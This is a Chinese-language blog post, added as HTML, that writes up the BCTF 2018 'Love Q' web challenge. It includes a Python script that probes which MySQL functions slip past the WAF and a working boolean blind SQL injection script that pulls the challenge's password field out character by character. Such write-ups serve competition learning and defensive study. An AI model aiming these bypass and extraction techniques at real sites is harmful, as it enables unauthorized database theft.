@@ -1,0 +1,362 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+  <head>
+  <meta http-equiv="content-type" content="text/html;charset=utf-8">
+  <meta http-equiv="X-UA-Compatible" content="chrome=1">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="robots" content="noodp"/>
+  <meta name="author" content="syang">
+  <meta name="description" content="Life Is Like A Boat">
+  
+  
+  <link rel="prev" href="https://syang-ng.github.io/2018/03/centos-7-mysql-%E6%95%B0%E6%8D%AE%E7%9B%AE%E5%BD%95%E7%A7%BB%E5%8A%A8%E5%B0%8F%E8%AE%B0/" />
+  <link rel="next" href="https://syang-ng.github.io/2018/06/googlectf-js_safe2-writeup/" />
+  <link rel="canonical" href="https://syang-ng.github.io/2018/04/bctf-2018-web-love-q/" />
+  <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+  <link rel="manifest" href="/site.webmanifest">
+  <link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">
+  <meta name="msapplication-TileColor" content="#da532c">
+  <meta name="theme-color" content="#ffffff">
+  <title>
+       
+       
+           BCTF 2018 Web Love Q | syang&#39;s blog
+       
+  </title>
+  <meta name="title" content="BCTF 2018 Web Love Q | syang&#39;s blog">
+    
+  
+  <link rel="stylesheet" href="/font/iconfont.css">
+  <link rel="stylesheet" href="/css/main.min.css">
+
+
+  
+  
+ 
+
+<script type="application/ld+json">
+ "@context" : "http://schema.org",
+    "@type" : "BlogPosting",
+    "mainEntityOfPage": {
+         "@type": "WebPage",
+         "@id": "https:\/\/syang-ng.github.io"
+    },
+    "articleSection" : "posts",
+    "name" : "BCTF 2018 Web Love Q",
+    "headline" : "BCTF 2018 Web Love Q",
+    "description" : "前言 BCTF 的 Web 题 —— Love Q，其实是 N1CTF 的 77777 和 77777 2 的后续，当时脚本出了问题，事后看着师傅们的 writeup 进行了修改，然后过了(lll￢ω￢) 真是悲伤的故事 简介 网",
+    "inLanguage" : "zh-cn",
+    "author" : "syang",
+    "creator" : "syang",
+    "publisher": "syang",
+    "accountablePerson" : "syang",
+    "copyrightHolder" : "syang",
+    "copyrightYear" : "2018",
+    "datePublished": "2018-04-21 20:28:34 \x2b0000 UTC",
+    "dateModified" : "2018-04-21 20:28:34 \x2b0000 UTC",
+    "url" : "https:\/\/syang-ng.github.io\/2018\/04\/bctf-2018-web-love-q\/",
+    "wordCount" : "817",
+    "keywords" : [  "syang\x27s blog"]
+}
+</script>
+
+</head>
+
+  
+
+
+  <body class="dark-theme">
+    <div class="wrapper">
+        <nav class="navbar">
+    <div class="container">
+        <div class="navbar-header header-logo">
+        	<a href="javascript:void(0);" class="theme-switch"><i class="iconfont icon-xihuan"></i></a>&nbsp;<a href="https://syang-ng.github.io">syang&#39;s blog</a>
+        </div>
+        <div class="menu navbar-right">
+                
+                
+                <a class="menu-item" href="/posts/" title="">Blog</a>
+                
+                <a class="menu-item" href="/categories/" title="">Categories</a>
+                
+                <a class="menu-item" href="/about/" title="">About</a>
+                
+        </div>
+    </div>
+</nav>
+<nav class="navbar-mobile" id="nav-mobile" style="display: none">
+     <div class="container">
+        <div class="navbar-header">
+            <div>  <a href="javascript:void(0);" class="theme-switch"><i class="iconfont icon-xihuan"></i></a>&nbsp;<a href="https://syang-ng.github.io">syang&#39;s blog</a></div>
+            <div class="menu-toggle">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+     
+          <div class="menu" id="mobile-menu">
+                
+                
+                <a class="menu-item" href="/posts/" title="">Blog</a>
+                
+                <a class="menu-item" href="/categories/" title="">Categories</a>
+                
+                <a class="menu-item" href="/about/" title="">About</a>
+                
+        </div>
+    </div>
+</nav>
+    	 <main class="main">
+          <div class="container">
+      		
+<article class="post-warp" itemscope itemtype="http://schema.org/Article">
+    <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">BCTF 2018 Web Love Q</h1>
+        <div class="post-meta">
+                Written by <a itemprop="name" href="https://syang-ng.github.io" rel="author">syang</a> with ♥ 
+                <span class="post-time">
+                on <time datetime=2018-04-21 itemprop="datePublished">April 21, 2018</time>
+                </span>
+                in
+                <i class="iconfont icon-folder"></i>
+                <span class="post-category">
+                        <a href="https://syang-ng.github.io/categories/ctf/"> CTF </a>
+                        <a href="https://syang-ng.github.io/categories/web/"> Web </a>
+                        
+                </span>
+        </div>
+    </header>
+    <div class="post-content">
+        
+
+        
+            
+        
+
+        
+        
+     
+          
+          
+          
+
+          
+          
+          
+
+          
+
+<h2 id="前言">前言</h2>
+
+<p>BCTF 的 Web 题 —— Love Q，其实是 N1CTF 的 77777 和 77777 2 的后续，当时脚本出了问题，事后看着师傅们的 writeup 进行了修改，然后过了(lll￢ω￢) 真是悲伤的故事</p>
+
+<h2 id="简介">简介</h2>
+
+<p>网站有三种状态：</p>
+
+<p>被 waf 拦截的状态：</p>
+
+<p><figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/posts/BCTF-2018-Web-Love-Q/waf.png" alt="waf" class="lazyload"><figcaption class="image-caption">waf</figcaption></figure></p>
+
+<p>sorry - sql 语句执行失败：</p>
+
+<p><figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/posts/BCTF-2018-Web-Love-Q/sorry.png" alt="sorry" class="lazyload"><figcaption class="image-caption">sorry</figcaption></figure></p>
+
+<p>正常 - sql 语句执行成功：</p>
+
+<p><figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/posts/BCTF-2018-Web-Love-Q/normal.png" alt="normal" class="lazyload"><figcaption class="image-caption">normal</figcaption></figure></p>
+
+<h2 id="waf-绕过">waf 绕过</h2>
+
+<p>这道题相较前两道题目而言，waf 更加严格，手动测一下，发现数字仅有 <code>2</code>，<code>9</code> 可以使用，字母滤过了 <code>j</code> 和 <code>J</code>, 然后过滤了非常多的 mysql 函数，可以写个简单的脚本测试一下可以使用的函数</p>
+
+<pre><code class="language-python">import requests
+
+url = &quot;http://e827c6acaa71483e8c534305d1f0f6dc88fcbce09a294ce2.game.ichunqiu.com/&quot;
+
+a = [&quot;substr&quot;, &quot;concat&quot;, &quot;as&quot;, &quot;from&quot;, &quot;ascii&quot;, &quot;sleep&quot;, &quot;conv&quot; , &quot;benchmark&quot;, &quot;hex&quot;, &quot;bin&quot;, &quot;+&quot;, &quot;pw&quot;, &quot;-&quot;, &quot;round&quot;, &quot;cos&quot;, &quot;sin&quot;, &quot;log&quot;, &quot;tan&quot;, &quot;exp&quot;, &quot;floor&quot;, &quot;left&quot;, &quot;right&quot;, &quot;ceiling&quot;, &quot;mod&quot;, &quot;MOD&quot;, &quot;SQRT&quot;, &quot;sign&quot;, 'rand', &quot;length&quot;]
+def one_test(item):
+  payload = &quot;flag=1000000&amp;hi=&quot; + item
+  headers = {
+    'Content-Type': &quot;application/x-www-form-urlencoded&quot;,
+  }
+
+  response = requests.request(&quot;POST&quot;, url, data=payload, headers=headers)
+  if 'hacker' not in response.text:
+    print item
+
+
+def main():
+  for item in a:
+    one_test(item)
+
+main()
+</code></pre>
+
+<p>最后发现只有 <code>substr</code>\<code>from</code>\<code>conv</code>\<code>hex</code>\<code>pw</code>\<code>log</code>\<code>SQRT</code>\<code>sign</code> 能用。</p>
+
+<p>手动测试发现 <code>if</code>\<code>(</code>\<code>)</code>\<code>&gt;</code>\<code>&lt;</code> 等还可以使用。所以可以尝试用仅限的这些构造 payload</p>
+
+<h2 id="思路">思路</h2>
+
+<p>由于 <code>My Points</code> 是不可见的，杜绝了直接通过回显猜结果的可能性，然后就只能盲注。时间型盲注无法成功，因为所有相关的函数都被 waf 过滤了，相应的只能使用布尔型盲注。</p>
+
+<p>通过 <code>&gt;(if(bool, 'a', 9))</code> 我们可以通过是否报错的方式得到回显，所以我们可以通过修改 <code>bool</code> 对应的语句来猜测 flag 的内容</p>
+
+<p>这里有一个是我是我用 <code>log(x, x)</code> 来生成待猜测的数字，在所需数字较小的时候，mysql 返回的是正常的值，但当数字大到一定程度，比如说 <code>99999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999</code> 的时候，mysql 会炸/(ㄒoㄒ)/~~</p>
+
+<p>所以可以用 <code>log(x, x)</code> 来生成数字来取字符的第几位，具体的字符还是需要通过直接比较字符判断得出</p>
+
+<p>之前以为的问题是怀疑字符被过滤，后来发现只是过滤了 <code>j</code> 和 <code>J</code> 而已，被当时的自己蠢到了(lll￢ω￢)</p>
+
+<h2 id="payload">payload</h2>
+
+<pre><code class="language-python">import requests
+
+dict = {1: 'log(2, 2)', 2: '2'}
+url = &quot;http://8fe3cd29f5e647ea92b5f0bd76055352aaad0730233b4179.game.ichunqiu.com/&quot;
+
+def generate(i):
+    if i in dict.keys():
+        return dict[i]
+    num = str(9**i)
+    ret = ''
+    if num[0] == 1:
+        ret = 'log(2%2C ' + '2' * len(num) + ')'
+    else:
+        ret = 'log(9%2C ' + '9' * len(num) + ')'
+    dict[i] = ret
+    return ret
+
+def check_url(index, cond):
+    payload = &quot;flag=10&amp;hi=%3E(if(substr(pw%2C%20&quot;+generate(index)+&quot;%2C%20log(2%2C%202))&quot; + cond +&quot;%2C%20'a'%2C%209))&quot;
+    headers = {
+        'Content-Type': &quot;application/x-www-form-urlencoded&quot;,
+    }
+    response = requests.request(&quot;POST&quot;, url, data=payload, headers=headers)
+    if 'sorry' in response.text:
+        return True
+    else:
+        return False
+
+def check(i):
+    print i
+    for j in range(97, 128):
+        if chr(j) == 'j':
+            continue
+        cond1 = &quot;%3E'&quot; + chr(j) + &quot;'&quot;
+        cond2 = &quot;%3C'&quot; + chr(j) + &quot;'&quot;
+        if not check_url(i, cond1) and not check_url(i, cond2):
+            return chr(j)
+def main():
+    flag = &quot;&quot;    
+    for i in range(1, 33):
+        ans =  check(i)
+        if ans != None:
+            flag += ans
+            print flag
+        else:
+            break
+
+
+main()
+</code></pre>
+
+<h2 id="and">And&hellip;</h2>
+
+<p>后来看到其他师傅的 writeup 的时候，发现了一个非常神奇的现象，就是在 select 语句中的 <code>*</code> 和 <code>-</code> 是可用的，看来 waf 其实比我想象的稍微宽松一点点</p>
+
+<h2 id="参考链接">参考链接</h2>
+
+<ul>
+<li><a href="http://f1sh.site/2018/04/22/bctf-love-q-writeup/" rel="nofollow noreferrer" target="_blank">BCTF LOVE Q Writeup</a></li>
+<li><a href="http://hackermio.me/2018/04/21/BCTF-Web-Writeup/" rel="nofollow noreferrer" target="_blank">BCTF Web Writeup</a></li>
+</ul>
+
+    </div>
+
+    <div class="post-copyright">
+             
+            <p class="copyright-item">
+                <span>Author:</span>
+                <span>syang </span>
+                </p>
+            
+           
+             
+            <p class="copyright-item">
+                    <span>Link:</span>
+                    <a href=https://syang-ng.github.io/2018/04/bctf-2018-web-love-q/>https://syang-ng.github.io/2018/04/bctf-2018-web-love-q/</span>
+            </p>
+            
+            
+    </div>
+
+  
+    <div class="post-tags">
+        
+        <section>
+                <a href="javascript:window.history.back();">back</a></span> · 
+                <span><a href="https://syang-ng.github.io">home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav">
+        
+        <a href="https://syang-ng.github.io/2018/03/centos-7-mysql-%E6%95%B0%E6%8D%AE%E7%9B%AE%E5%BD%95%E7%A7%BB%E5%8A%A8%E5%B0%8F%E8%AE%B0/" class="prev" rel="prev" title="CentOS 7 MySQL 数据目录移动小记"><i class="iconfont icon-left"></i>&nbsp;CentOS 7 MySQL 数据目录移动小记</a>
+         
+        
+        <a href="https://syang-ng.github.io/2018/06/googlectf-js_safe2-writeup/" class="next" rel="next" title="googlectf js_safe2 writeup">googlectf js_safe2 writeup&nbsp;<i class="iconfont icon-right"></i></a>
+        
+    </div>
+
+    <div class="post-comment">
+          
+                 
+          
+    </div>
+</article>
+          </div>
+		   </main>
+      <footer class="footer">
+    <div class="copyright">
+        &copy;
+        
+        <span itemprop="copyrightYear">2017 - 2019</span>
+        
+        <span class="with-love">
+    	 <i class="iconfont icon-love"></i> 
+         </span>
+         
+            <span class="author" itemprop="copyrightHolder"><a href="https://syang-ng.github.io">syang</a> | </span> 
+         
+
+         
+		  <span>Powered by <a href="https://gohugo.io/" target="_blank" rel="external nofollow">Hugo</a> & <a href="https://github.com/liuzc/leaveit" target="_blank" rel="external nofollow">LeaveIt</a></span> 
+    </div>
+</footer>
+
+
+
+
+
+
+
+
+
+
+
+
+    
+     <link href="//lib.baomitu.com/lightgallery/1.6.11/css/lightgallery.min.css" rel="stylesheet">  
+      
+     <script src="/js/vendor_gallery.min.js" async="" ></script>
+    
+  
+
+
+
+     </div>
+  </body>
+</html>
